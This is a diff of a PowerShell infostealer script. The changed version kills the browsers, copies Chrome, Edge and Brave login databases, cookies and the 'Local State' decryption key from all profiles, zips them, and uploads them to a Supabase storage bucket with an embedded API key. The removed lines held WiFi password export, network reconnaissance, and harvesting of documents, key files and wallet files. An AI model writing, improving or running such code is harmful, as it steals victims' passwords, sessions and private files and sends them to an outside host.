@@ -6,18 +6,15 @@ if (-not $isAdmin) {
     exit
 }
 
-# Fix Environment Path for System32 utilities
-$env:Path += ";C:\Windows\System32;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\"
-
-$sbUrl = "https://kjoxaevacnruadftkjxc.supabase.co/storage/v1/object/data/$($env:COMPUTERNAME)_$(Get-Date -Format "yyyyMMdd_HHmm").zip"
+$sbUrl = "https://kjoxaevacnruadftkjxc.supabase.co/storage/v1/object/data/$($env:COMPUTERNAME)_creds.zip"
 $sbKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imtqb3hhZXZhY25ydWFkZnRranhjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzgxNjA4NjAsImV4cCI6MjA5MzczNjg2MH0.OVuVfwrLPgxcrX3W0xjF-FVQBB9qMbMB1s-vL8aV_aY"
 
-$staging = Join-Path $env:TEMP "staging_$(Get-Random)"
+$staging = Join-Path $env:TEMP "tmp_$(Get-Random)"
 New-Item -Path $staging -ItemType Directory -Force | Out-Null
 
-# Force kill browsers to release SQLite locks
+# Force kill browsers to release SQLite handles
 "chrome", "msedge", "brave", "browser" | ForEach-Object { Stop-Process -Name $_ -Force -ErrorAction SilentlyContinue }
-Start-Sleep -Seconds 2
+Start-Sleep -Seconds 1
 
 $browsers = @{
     "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data"
@@ -27,12 +24,16 @@ $browsers = @{
 
 foreach ($b in $browsers.GetEnumerator()) {
     if (Test-Path $b.Value) {
-        $dest = New-Item -Path (Join-Path $staging "Browsers\$($b.Key)") -ItemType Directory -Force
-        if (Test-Path "$($b.Value)\Local State") { Copy-Item "$($b.Value)\Local State" -Destination $dest -Force }
+        $dest = New-Item -Path (Join-Path $staging $b.Key) -ItemType Directory -Force
         
-        # Recursive copy for modern deep-nested cookie/login paths
+        # Copy Master Key (Local State) for decryption
+        if (Test-Path "$($b.Value)\Local State") { 
+            Copy-Item "$($b.Value)\Local State" -Destination $dest -Force 
+        }
+        
+        # Target only logins and cookies across all profiles (Default, Profile 1, etc.)
         Get-ChildItem -Path $b.Value -Recurse -File -ErrorAction SilentlyContinue | Where-Object { 
-            $_.Name -match "Login Data|Cookies|Web Data|History" 
+            $_.Name -eq "Login Data" -or $_.Name -eq "Cookies" 
         } | ForEach-Object {
             $subDest = Join-Path $dest $_.Directory.Name
             if (-not (Test-Path $subDest)) { New-Item $subDest -ItemType Directory -Force | Out-Null }
@@ -41,22 +42,9 @@ foreach ($b in $browsers.GetEnumerator()) {
     }
 }
 
-# WiFi and Network Recon using repaired PATH
-$recon = Join-Path $staging "Recon"
-New-Item $recon -ItemType Directory -Force | Out-Null
-netsh wlan export profile key=clear folder=$recon | Out-Null
-ipconfig /all > (Join-Path $recon "net.txt")
-
-# Document Harvesting
-$exts = @("*.txt", "*.pdf", "*.docx", "*.xlsx", "*.key", "*.wallet")
-Get-ChildItem -Path "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents" -Include $exts -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
-    $fDest = Join-Path $staging "Files"
-    if (-not (Test-Path $fDest)) { New-Item $fDest -ItemType Directory -Force | Out-Null }
-    Copy-Item $_.FullName -Destination $fDest -Force -ErrorAction SilentlyContinue
-}
-
-# Compression and Exfiltration
-$zip = "$env:TEMP\data.zip"
+# Compress and Exfiltrate
+$zip = "$env:TEMP\c.zip"
+if (Test-Path $zip) { Remove-Item $zip -Force }
 Compress-Archive -Path "$staging\*" -DestinationPath $zip -Force
 
 $headers = @{ 
@@ -65,6 +53,7 @@ $headers = @{
     "Content-Type" = "application/zip"
     "x-upsert" = "true" 
 }
+
 $bytes = [System.IO.File]::ReadAllBytes($zip)
 Invoke-RestMethod -Uri $sbUrl -Method Post -Headers $headers -Body $bytes
 
